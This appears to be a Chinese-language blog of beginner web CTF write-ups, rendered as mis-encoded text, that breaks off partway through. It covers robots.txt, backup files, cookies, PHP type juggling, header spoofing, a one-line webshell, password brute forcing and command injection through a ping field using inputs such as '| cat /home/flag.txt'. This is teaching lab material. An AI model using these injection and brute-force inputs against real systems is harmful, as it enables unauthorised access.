<h1 id="Webæ–°æ‰‹"><a href="#Webæ–°æ‰‹" class="headerlink" title="Webæ–°æ‰‹"></a>Webæ–°æ‰‹</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>å³é”®ä¸ç®¡ç”¨ï¼Œç›´æ¥ç”¨F12æŸ¥çœ‹</p>
<p>å¾—åˆ°flag</p>
<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>ä¸æ¸…æ¥šrobotsåè®®æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯æˆ‘ç™¾åº¦äº†ä¸€ä¸‹ï¼Œ</p>
<p><code>robotsåè®®ä¹Ÿç§°çˆ¬è™«åè®®ã€çˆ¬è™«è§„åˆ™ç­‰,æ˜¯æŒ‡ç½‘ç«™å¯å»ºç«‹ä¸€ä¸ªrobots.txtæ–‡ä»¶æ¥å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–,å“ªäº›é¡µé¢ä¸èƒ½æŠ“å–,è€Œæœç´¢å¼•æ“åˆ™é€šè¿‡è¯»å–robots.txtæ–‡ä»¶æ¥è¯†åˆ«è¿™ä¸ªé¡µé¢æ˜¯å¦å…è®¸è¢«æŠ“å–</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´ç½‘ç«™ä¸‹æœ‰ä¸€ä¸ªrobots.txtæ–‡ä»¶ï¼Œè§„å®šäº†é¡µé¢æŠ“å–è§„åˆ™ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è®¿é—®<code>http://111.200.241.244:54251/robots.txt</code></p>
<p>ç•Œé¢æ˜¾ç¤ºå¦‚ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621223828917.png" alt="image-20220621223828917"></p>
<p>disallowå°±æ˜¯ä¸å…è®¸æŠ“å–çš„é¡µé¢ï¼Œçœ‹åˆ°flagï¼Œå°±çŸ¥é“æˆ‘ä»¬å°±è¦è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯è®¿é—®<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°æ‰¾æ–‡ä»¶ï¼Œé¦–å…ˆæˆ‘å°±æƒ³ç”¨dirsearchæ‰«ä¸€æ‰«</p>
<p>æ‰“å¼€é¶åœºå…ˆçœ‹åˆ°</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224315003.png" alt="image-20220621224315003"></p>
<p>äºæ˜¯æˆ‘å…ˆæ‰«ä¸€æ‰«ï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰ index.phpæ–‡ä»¶çš„æ–‡ä»¶å</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224424076.png" alt="image-20220621224424076"></p>
<p>æ‰«å®Œåå‘ç°index.php.bakæ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾å®ƒå°±æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥è®¿é—®å®ƒä¸€ä¸‹<code>http://111.200.241.244:52824/index.php.bak</code></p>
<p>è‡ªåŠ¨ä¸‹è½½å¥½äº†index.php.bakï¼Œç”¨æ–‡æœ¬æ‰“å¼€</p>
<p>å¾—åˆ°flag</p>
<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®ä»–åœ¨cookieé‡Œæ”¾äº†äº›ä¸œè¥¿ï¼Œå°å®ç–‘æƒ‘åœ°æƒ³ï¼šè¿™æ˜¯å¤¹å¿ƒé¥¼å¹²çš„æ„æ€å—ï¼Ÿ</p>
<h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>æˆ‘çš„æ—¥å¸¸éšè®°ç¬¬ä¸€ç« å¤§æ¦‚è®²äº†cookieçš„ä½œç”¨å’Œå«ä¹‰ï¼Œè¯¥é¢˜å¯ä»¥ä¸äº†è§£ä¹Ÿå¯ä»¥å®Œæˆ</p>
<p>ç›®å‰æˆ‘çœ‹cookieçš„æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯burpsuiteæŠ“åŒ…çœ‹ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ç”¨ç«ç‹æ’ä»¶Tamper Dataï¼Œè¿™é‡Œæˆ‘ç”¨brup</p>
<p>æˆ‘ä»¬å…ˆç”¨burpsuiteæŠ“ä¸€ä¸ªåŒ…çœ‹çœ‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225826671.png" alt="image-20220621225826671"></p>
<p>å‘ç°cookieå¤„æç¤ºæœ‰ä¸ªcookie.phpæ–‡ä»¶ï¼Œè®¿é—®<code>http://111.200.241.244:49599/cookie.php</code>çœ‹çœ‹ï¼Œå¦‚ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225920306.png" alt="image-20220621225920306"></p>
<p>äºæ˜¯æˆ‘ä»¬æŠŠæŠ“åŒ…æ•°æ®å‘åˆ°repeateré‡Œçœ‹çœ‹response</p>
<p>å¾—åˆ°flag</p>
<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¯¥é¢˜è¯´æŒ‰è¿™ä¸ªæŒ‰é’®ä¸èƒ½æŒ‰ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ï¼Œçœ‹çœ‹æºç </p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621230709669.png" alt="image-20220621230709669"></p>
<p>çœ‹åˆ°æœ‰ä¸ªdisabledï¼Œå°±æ˜¯å®ƒä½¿å¾—æŒ‰é’®æ— æ³•è¢«æŒ‰ï¼Œæ‰€ä»¥åˆ å»å°±å¯ä»¥</p>
<p>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨æŸ¥çœ‹å™¨é‡Œé¢ï¼ŒæŠŠdisabledè¯­å¥åˆ å»</p>
<p>æŒ‰é’®å°±å¯ä»¥æŒ‰äº†ï¼Œç‚¹å‡»</p>
<p>å¾—åˆ°flag</p>
<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æˆ‘ä»¬å…ˆéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¼¹çª—æ˜¾ç¤º</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115614924.png" alt="image-20220623115614924"></p>
<p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ç”¨æˆ·åæ˜¯  adminï¼Œä½†æ˜¯å¯†ç ä¸çŸ¥é“ï¼ŒåªçŸ¥é“æ˜¯éšæ‰‹è¾“å…¥çš„ï¼Œæˆ‘ä»¬è¯•è¯•burpæŠ“åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰æç¤º</p>
<p>åœ¨responseé‡Œçœ‹åˆ°</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115811366.png" alt="image-20220623115811366"></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±çŸ¥é“è¦ç”¨burpçš„å¯†ç çˆ†ç ´ï¼Œå…·ä½“æ“ä½œå°±ä¸ç»†è®²ï¼Œéšè®°æœ‰å†™</p>
<p>è¿™æ˜¯éƒ¨åˆ†å¯†ç txtçš„ç½‘ç«™ï¼Œå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼Œé’ˆå¯¹ä¸åŒç¯å¢ƒï¼Œç”¨ä¸åŒå¯†ç æ–‡æœ¬</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>æœ€åçˆ†å‡ºå¯†ç 123456,ä»¥ç”¨æˆ· adminè¾“å…¥ç™»å½•</p>
<p>å¾—åˆ°flag</p>
<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆè¿›è¡Œä»£ç åˆ†æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°flagè¢«åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªflag1ï¼Œä¸€ä¸ª flag2</p>
<p>a,bä¸¤ä¸ªå˜é‡ä»¥getå‹è¾“å…¥</p>
<p>ç¬¬ä¸€ä¸ªifè¦æ±‚a==0ä¸”aä¸ºtureï¼Œè¿™æ˜æ˜¾çŸ›ç›¾ï¼Œå½“a=0å°±ä»£è¡¨aä¸ºfalse</p>
<p>æ‰€ä»¥è¿™é‡Œæ¶‰åŠäº†phpæ€§è´¨ï¼Œphpå±äºä¸€é—¨å¼±ç±»å‹è¯­è¨€</p>
<p><code>å¼±ç±»å‹ï¼šä¸å¿…å‘ PHP å£°æ˜è¯¥å˜é‡çš„æ•°æ®ç±»å‹ï¼ŒPHP ä¼šæ ¹æ®å˜é‡çš„å€¼ï¼Œè‡ªåŠ¨æŠŠå˜é‡è½¬æ¢ä¸ºæ­£ç¡®çš„æ•°æ®ç±»å‹</code></p>
<p>æ‰€ä»¥å½“åœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­açš„å€¼æ—¶ï¼Œaå¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ€§è´¨ï¼Œa=0Aï¼Œå½“è¿›è¡Œa==0åˆ¤æ–­æ—¶ï¼Œä¼šè‡ªåŠ¨æŠŠaå½“ä½œæ•°å­—å‹ï¼Œä¹Ÿå°±æ˜¯æŠŠa=0Aåçš„Aå»æ‰ï¼Œä»è€Œæˆç«‹ï¼›</p>
<p>è€Œå½“åˆ¤æ–­aæ˜¯å¦ä¸ºtureæ—¶ï¼Œç”±äºa=0Aè€Œé0ï¼Œæ‰€ä»¥ç»“æœä¸ºtureï¼Œè¾“å‡ºflag1</p>
<p><em>è¿™é‡Œæ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæ˜¯ <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>ï¼Œé‚£æŒ‰ä¸Šé¢å¯¹aèµ‹å€¼è¿˜å¯ä»¥å—ï¼Ÿ</em></p>
<p><em>è¿™é‡Œæ¶‰åŠphpç±»å‹æ¯”è¾ƒ==ä¸===çš„åŒºåˆ«</em></p>
<ul>
<li><em>æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· <strong>==</strong> æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚</em></li>
<li><em>ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· <strong>===</strong> æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚</em></li>
</ul>
<p><em>ä¸Šé¢ä»£ç ä¸­==å¯¹ç±»å‹ä¸æ¯”è¾ƒï¼Œæ‰€ä»¥a=0Aä¸0æ¯”è¾ƒæ—¶ï¼Œå¯å½“ä½œa=0ä¸0æ¯”è¾ƒ</em></p>
<p><em>ä½†æ˜¯å½“ä¸º===æ—¶ï¼Œa=0Aä¸å±äºæ•°å­—å‹ï¼Œæ‰€ä»¥å½“if(a===0)è¿”å›falseï¼Œä»è€Œè¿”å›false</em></p>
<p>ç¬¬äºŒä¸ªifçœ‹åˆ°ï¼Œis_numeric($b)ï¼Œè¿™é‡Œè¦äº†è§£ä¸€ä¸‹is_numereic()å‡½æ•°çš„ä½œç”¨</p>
<p><code>is_numeric()å‡½æ•°ï¼šç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEï¼Œæ³¨æ„æµ®ç‚¹å‹è¿”å› 1ï¼Œå³ TRUE</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´bçš„å€¼ä¸èƒ½ä¸ºæ•°å­—å’Œæ•°å­—ä¸²ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªifè¦æ±‚b&gt;1234ï¼Œæ‰€ä»¥bè¦ä¸ºæ•°å­—</p>
<p>è¿™ä¸ªå’Œaä¸€æ ·ï¼Œåˆ©ç”¨äº†phpçš„å¼±ç±»å‹æ€§è´¨ï¼Œæ—¢ç„¶ä¸èƒ½ä¸ºæ•°å­—ï¼Œé‚£b=1235Bï¼Œè¿™æ ·å½“bä¸1234æ¯”è¾ƒæ—¶ï¼Œbè½¬åŒ–ä¸ºæ•°å­—å‹ï¼Œå»æ‰Bï¼Œ1235&gt;1234æˆç«‹ï¼Œè¾“å‡ºflag2</p>
<p>äºæ˜¯payloadä¸º</p>
<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ</p>
<h3 id="2ï¼‰wp-1"><a href="#2ï¼‰wp-1" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>Getå’ŒPostæ–¹å¼æ˜¯HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•</p>
<p>Getæ–¹å¼ç›´æ¥åœ¨urlè¾“å…¥?a=1</p>
<p><code>http://111.200.241.244:52081/?a=1</code></p>
<p>Postæ–¹å¼åˆ©ç”¨ç«ç‹æ’ä»¶HackerBarä»¥postæ–¹å¼b=2</p>
<p>run</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624164728734.png" alt="image-20220624164728734"></p>
<p>å¾—åˆ°flag</p>
<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆäº†è§£ä»€ä¹ˆæ˜¯xxfå’Œreferer</p>
<p><code>ï¼ˆ1ï¼‰X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP  ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</code></p>
<p><code>ï¼ˆ2ï¼‰HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚referer  æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯è®°å½•å½“å‰è¯·æ±‚é¡µé¢çš„æ¥æºé¡µé¢çš„åœ°å€ã€‚æœåŠ¡å™¨ä½¿ç”¨refererç¡®è®¤è®¿é—®æ¥æºï¼Œå¦‚æœrefererå†…å®¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¦æˆªæˆ–è€…é‡å®šå‘è¯·æ±‚ã€‚</code></p>
<p>æŠ“åŒ…åï¼Œå‘ç°å¹¶æ²¡æœ‰X-Forwarded-Forå’ŒRefererï¼ŒåŠ ä¸Šå³å¯</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173529705.png" alt="image-20220624173529705"></p>
<p>çœ‹é¢˜ç•Œé¢ï¼Œæç¤ºipå¿…é¡»ä¸º123.123.123.123ï¼Œäºæ˜¯åœ¨æŠ“åŒ…æ•°æ®é‡ŒåŠ ä¸Š</p>
<p><code>X-Forwarded-Forï¼š 123.123.123.123</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174546646.png" alt="image-20220624174546646"></p>
<p>sendæ•°æ®åï¼Œå‘ç°responseé‡Œå‡ºç°ä»¥ä¸‹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æœ‰å£°æ˜æ˜¯ä»è°·æ­Œç•Œé¢è¿‡æ¥çš„</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173805175.png" alt="image-20220624173805175"></p>
<p>ä¹Ÿå°±æ˜¯è¿˜è¦åŠ ä¸Š</p>
<p><code>Referer:  https://www.google.com</code></p>
<p>æœ€åå¦‚ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174117936.png" alt="image-20220624174117936"></p>
<p>sendåˆ°responseå</p>
<p>å¾—åˆ° flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œ</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°è¿™å¥ä»£ç æˆ‘ä¸€ä¸‹æƒ³åˆ°ä¸€å¥è¯æœ¨é©¬ï¼Œæ ‡é¢˜<a href="../../../../2022/06/21/Qusetion/">webshell</a>ä¹Ÿæç¤ºè¿™ä¸ªæœ¨é©¬é¢˜ï¼Œæ ¹æ®æè¿°æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæœ¨é©¬åœ¨index.phpé‡Œ</p>
<p>ä¸äº†è§£çš„å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« </p>
<p><a href="https://www.jianshu.com/p/6b815f951db3">phpä¸€å¥è¯æœ¨é©¬</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624210259387.png" alt="image-20220624210259387"></p>
<p>ç”¨èšå‰‘è¿æ¥å³å¯ï¼Œè¿™é‡Œå¯¹èšå‰‘ä½¿ç”¨æ–¹æ³•ä¸èµ˜è¿°ï¼Œå»ºè®®è‡ªå·±æ“ä½œå­¦ä¹ </p>
<p>å¾—åˆ°flag</p>
<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ ¹æ®é¢˜ç›®åçŸ¥é“è¿™æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´çš„é¢˜ï¼Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹<a href="../../../../2022/05/28/Web-study">å‘½ä»¤æ‰§è¡Œ</a>çš„çŸ¥è¯†</p>
<p>å…ˆç”¨è‡ªå·±çš„IPè¯•ä¸€ä¸‹</p>
<p><code>120.0.0.1</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624213448262.png" alt="image-20220624213448262"></p>
<p>å¾—åˆ°ä»¥ä¸‹æ•°æ®ï¼Œç”±æ­¤å¯çŸ¥æˆ‘ä»¬ä¸Šä¼ çš„å‘½ä»¤æ˜¯<code>ping -c 3 + è¾“å…¥çš„è¯­å¥</code>ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°ç®¡é“ç¬¦</p>
<p>æ­¤å¤„ä¸æ­¢å¯ä»¥ç”¨ |ï¼Œäº†è§£äº†å…¶ä»–ç®¡é“ç¬¦çš„ä½œç”¨ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215127339.png" alt="image-20220624215127339"></p>
<p>åœ¨åˆ©ç”¨ç®¡é“ç¬¦ï¼Œåœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•æŸ¥æ‰¾æœ‰æ²¡æœ‰åä¸ºflag.txtçš„æ–‡ä»¶</p>
<p><code>120.0.0.1 | find  / -name flag.txt</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215415187.png" alt="image-20220624215415187"></p>
<p>å¾—åˆ°flag.txtçš„ä½ç½®çš„ç»å¯¹è·¯å¾„</p>
<p>è¾“å‡ºæ‰“å°flag,txt</p>
<p><code>120.0.0.1 | cat /home/flag.txt</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>å°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚</p>
<p>(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} )</p>
<h3 id="2ï¼‰wp-2"><a href="#2ï¼‰wp-2" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜æ¶‰åŠä»£ç å®¡è®¡ï¼Œçœ‹èµ·æœ‰ç‚¹éš¾åº¦ï¼Œä½†è¯´å®è¯å¤§éƒ¨åˆ†å†…å®¹ä¸ä»£ç å®¡è®¡æ— å…³ï¼Œä½†å¯ä»¥åˆ†æä¸€ä¸‹</p>
<p>å¼€å§‹ç•Œé¢å¼¹çª—è¾“å…¥å¯†ç </p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221241740.png" alt="image-20220624221241740"></p>
<p>è¾“å…¥é”™è¯¯ï¼Œæç¤ºFAUX PASSWORD HAHA</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221310762.png" alt="image-20220624221310762"></p>
